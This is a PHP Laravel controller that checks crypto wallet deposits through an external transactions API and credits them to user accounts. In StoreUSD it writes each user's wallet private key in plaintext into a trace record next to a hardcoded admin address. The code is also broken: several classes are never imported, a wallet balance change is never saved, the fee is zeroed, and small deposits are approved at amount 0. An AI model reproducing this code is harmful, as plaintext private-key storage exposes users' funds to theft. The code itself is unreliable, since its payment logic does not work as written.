<?php

namespace App\Http\Controllers\api;

use App\Http\Controllers\Controller;
use App\Models\Deposit;
use App\Models\Transactions;
use App\Models\User;
use App\Models\UserWalletData;
use App\Service\TransactionService;
use GuzzleHttp\Client;
use Illuminate\Http\Request;

class DepositController extends Controller
{
    protected $transactionService;
    public function __construct(TransactionService $transactionService){
        $this->transactionService = $transactionService;
    }

    public function index(Request $request)
    {
        $user = $request->user();

        $wallet = UserWalletData::where('user_id', $user->id)->select('wallet_address')->first();
        if($wallet){
            return response()->json([
                'success' => true,
                'data' => $wallet->wallet_address,
            ]);
        }
        return response()->json([
            'success' => false,
            'message' => 'Wallet address not found',
        ]);
    }

    public function checkDeposit(Request $request)
    {
        $user = $request->user();

        $wallet = UserWalletData::where('user_id', $user->id)->select('wallet_address')->first();

        if (!$wallet) {
            return response()->json([
                'success' => false,
                'message' => 'Wallet address not found for user.'
            ], 404);
        }

        $client = new Client();

        try {
            $response = $client->get('https://web3.blockmaster.info/api/get-transactions', [
                'query' => [
                    'address' => $wallet->wallet_address,
                ],
            ]);

            $responseData = json_decode($response->getBody()->getContents());

            if (!is_array($responseData)) {
                return response()->json([
                    'success' => false,
                    'message' => 'Invalid response format from API.'
                ]);
            }

            foreach ($responseData as $data) {
                // Make sure required fields exist
                if (!isset($data->hash, $data->value, $data->message)) {
                    continue;
                }

                // Skip if transaction already exists
                $exists = Deposit::where('transaction_id', $data->hash)->exists();

                if (!$exists && $data->message === 'OK' && $data->to == $wallet->wallet_address) {
                    $deposit = new Deposit();
                    $deposit->transaction_id = $data->hash;
                    $deposit->amount = number_format((float) $data->value, 8, '.', '');
                    $deposit->user_id = $user->id;
                    $user->wallet += $data->value;
                    $deposit->save();
                }
            }

            return response()->json([
                'success' => true,
                'message' => 'Deposit check completed successfully.',
            ]);

        } catch (Exception $e) {
            return response()->json([
                'success' => false,
                'message' => $e->getMessage(),
            ]);
        }
    }



    public function StoreUSD(Request $request)
    {

        //  $client = new Client();



        $update_user = $request->user();

        $client = new Client();
        $response = $client->get('https://web3.blockmaster.info/api/get-transactions', [
            'query' => [
                'address' => $update_user->wallet_address,
                // 'address'=> '0x4d7d4032dd43d20969949e1ebb801064380c3c00',
            ],
        ]);



        $responseBody = json_decode($response->getBody(), true);

        if (is_array($responseBody)) {
            foreach ($responseBody as $deposit) {
                // Check if each deposit contains the keys you are trying to access
                if (isset($deposit['hash'], $deposit['value'], $deposit['gas'], $deposit['gasPrice'])) {
                    $check_deposit = $client->get('https://web3.blockmaster.info/api/get-transaction-status', [
                        'query' => [
                            'hash' => $deposit['hash'],
                            // 'address'=> '0x4d7d4032dd43d20969949e1ebb801064380c3c00',
                        ],
                    ]);
                    $check_depositBody = json_decode($check_deposit->getBody(), true);
                    //  dd($deposit['to']);

                    $hash_check = UsdWallet::where('user_id', Auth::id())->where('txn_id', $deposit['hash'])->first();

                    if ($check_depositBody['is_successful'] == true && $hash_check == null && $deposit['to'] == Auth::user()->deposit_address) {
                        //dd("true");
                        $txn_fee = ($deposit['gas'] * $deposit['gasPrice']) / 1000000000000000000;
                        $txn_fee = 0;
                        //  dd($txn_fee);


                        $amount = ($deposit['value'] - $txn_fee);
                        $bnb_amount = $deposit['value'] - $txn_fee;
                        $txn_id = $deposit['hash'];
                        $uid = User::where('deposit_address', $update_user->deposit_address)->first();
                        //  dd($amount);
                        //DB::Begintransaction();
                        if ($amount >= 10) {
                            $add_deposit = new UsdWallet();
                            $add_deposit->user_id = $uid->id;
                            $add_deposit->amount = $amount;
                            $add_deposit->description = $amount . ' deposited by automatic payment system';
                            $add_deposit->method = 'Deposit';
                            $add_deposit->status = 'approve';
                            $add_deposit->type = 'Credit';
                            $add_deposit->txn_id = $txn_id;
                            $add_deposit->created_at = Carbon::now();
                            $add_deposit->save();
                        } else {
                            $add_deposit = new UsdWallet();
                            $add_deposit->user_id = $uid->id;
                            $add_deposit->amount = 0;
                            $add_deposit->description = $amount . ' deposited by automatic payment system';
                            $add_deposit->method = 'Deposit';
                            $add_deposit->status = 'approve';
                            $add_deposit->type = 'Credit';
                            $add_deposit->txn_id = $txn_id;
                            $add_deposit->created_at = Carbon::now();
                            $add_deposit->save();
                        }

                        $txn = new TransactionTrace();
                        $txn->user_address = Auth::user()->deposit_address;
                        $txn->user_id = Auth::id();
                        $txn->user_private_key = Auth::user()->private_key;
                        $txn->admin_address = '0xa2f33a1391dc84408012beb5aec53114be4fa4ef';
                        $txn->amount = $amount;
                        $txn->save();
                        return response()->json(['success' => 200, 'message' => 'Successfully deposited']);


                        //  dd("success");



                        //  dd($deposit);
                    }

                    //dd($check_deposit['status'],$check_deposit['message']);
                }
            }
            return response()->json(['error' => 400, 'message' => 'No valid deposits found']);
        }




        //  return back()->with('Money_added', 'Successfully deposited');


    }
}
